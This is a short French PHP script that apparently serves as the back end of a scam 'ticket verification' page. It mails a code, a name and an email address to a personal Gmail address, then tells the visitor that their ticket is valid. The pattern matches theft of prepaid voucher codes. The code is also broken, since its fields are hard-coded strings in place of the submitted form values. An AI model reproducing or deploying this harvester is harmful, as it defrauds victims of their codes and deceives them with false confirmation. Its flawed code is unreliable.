<?php
    $msg_erreur="Erreur. Les champs suivants doivent être obligatoirement remplis :<br/>";
    $msg_ok='Votre ticket est bien valide';
    $message=$msg_erreur;
    $mail_corps=$_POST;
    $code="code";
    $NOM="NOM";
    $email="email";
    $destinataire='franciscokenett048@gmail.com';
   $objet='verification de site';
   
$mail_corps= "Message de : $email && $NOM \n";
$mail_corps .= "CODE:$code\n";
if (mail($destinataire,$objet,$mail_corps)) {
    //Le mail est bien expédié
    echo "$msg_ok";
  } else {
    //Le mail n'a pas été expédié
    echo 'Une erreur est survenue';
  }
?>